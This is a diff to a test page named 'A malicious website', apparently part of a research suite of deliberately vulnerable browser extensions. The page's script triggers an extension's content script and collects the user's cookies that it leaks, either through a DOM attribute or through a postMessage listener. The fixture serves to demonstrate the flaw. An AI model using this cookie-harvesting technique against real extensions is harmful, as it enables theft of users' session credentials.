@@ -7,11 +7,12 @@
 
 		<h1>A malicious website</h1>
 
-		<!-- /vuln01_weak_mv3_dom -->
+		<!-- (a) /vuln01_weak_mv3_dom & (b) /vuln01_weak_mv3_dom_and_postMessage -->
 		<!--
 		The content script of this extension leaks sensitive data that it received from the service worker (namely all of the user's cookies)
-		into the DOM of a (potentially malicious) website (namely into an attribute called "cookies" of an element with id "some-id") after
-		this website triggers a very certain DOM event (namely changing an attribute called "data-some-attr" of an element with id "some-id").
+		(a) into the DOM of a (potentially malicious) website (namely into an attribute called "cookies" of an element with id "some-id"), or
+		(b) to a (potentially malicious) website via a postMessage,
+		after this website triggers a very certain DOM event (namely changing an attribute called "data-some-attr" of an element with id "some-id").
 		-->
 		<span id="some-id" data-some-attr="foo">This is a totally benign piece of text.</span><br/>
 		<span id="cookies"></span>
@@ -22,12 +23,24 @@
 				document.getElementById('some-id').setAttribute("data-some-attr", "bar");
 			}, 100);
 
+			// (a) /vuln01_weak_mv3_dom:
 			setTimeout(function() {
 				// Access the leaked sensitive data:
-				let leaked_cookie_data = document.getElementById('some-id').getAttribute("cookies");
-				document.getElementById('cookies').innerText =
-					"Leaked cookie data: " + leaked_cookie_data.substring(0, 1000) + " ... " + leaked_cookie_data.substring(leaked_cookie_data.length-1000);
+				if (document.getElementById('some-id').hasAttribute("cookies")) {
+					let leaked_cookie_data = document.getElementById('some-id').getAttribute("cookies");
+					document.getElementById('cookies').innerText = "Leaked cookie data (received via DOM): "
+						+ leaked_cookie_data.substring(0, 1000) + " ... " + leaked_cookie_data.substring(leaked_cookie_data.length-1000);
+				}
 			}, 300);
+
+			// (b) /vuln01_weak_mv3_dom_and_postMessage:
+			window.addEventListener('message', event => {
+				if (event.data && event.data.type == "FROM_EXTENSION") {
+					let leaked_cookie_data = JSON.stringify(event.data);
+					document.getElementById('cookies').innerText = "Leaked cookie data (received via postMessage): "
+						+ leaked_cookie_data.substring(0, 1000) + " ... " + leaked_cookie_data.substring(leaked_cookie_data.length-1000);
+				}
+			});
 		</script>
 
 	</body>
